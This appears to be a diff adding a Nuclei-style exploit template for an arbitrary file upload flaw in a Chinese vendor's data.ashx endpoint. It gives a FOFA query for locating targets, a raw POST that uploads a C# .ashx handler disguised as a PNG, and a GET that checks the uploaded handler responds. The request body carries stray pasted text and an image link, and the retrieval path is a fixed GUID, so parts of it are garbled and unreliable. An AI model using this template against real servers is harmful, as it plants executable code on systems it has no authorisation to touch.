@@ -1,0 +1,62 @@
+id: poc-nclpafpk76hadytg
+info:
+  name: 山东聚恒网络技术有限公司聚恒中台data.ashx存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/nclpafpk76hadytg'
+  tags: file-upload,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: nclpafpk76hadytg
+    fofa: icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"
+http:
+- raw:
+  - 'POST /sysplat/dataget/data.ashx?type=voheadfile&key=&ocrtype=&vo=&field=1 HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate
+
+    Content-Type: multipart/form-data; boundary=----geckoformboundary9933b1efc5e0d94a40b1571aebec8742
+
+    Accept: application/json, text/plain, */*
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:150.0) Gecko/20100101 Firefox/150.0
+
+    Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
+
+    Content-Length: 681918
+
+
+    ------geckoformboundary9933b1efc5e0d94a40b1571aebec8742
+
+    Content-Disposition: form-data; name="txt_headfile"; filename="glass.ashx"
+
+    Content-Type: image/png
+
+
+    <%@ WebHandler Language="C#" Class="Hello" %>
+
+    using System.Web;public class Hello:IHttpHandler{public void ProcessRequest(HttpContext c){c.Response.Write("hello");}public bool IsReusable{get{return false;}}}
+
+    ------geckoformboundary9933b1efc5e0d94a40b1571aebec8742--
+
+    ![](https://cdn.nlark.com/yuque/0/2026/png/43110909/1788789599527-a90af294-52bc-4752-855a-92c80212bbb6.png)
+
+    上传定位:'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /sysplat/dataget/files/039cc123-dbbf-4405-bd85-4f85926a8489.ashx HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
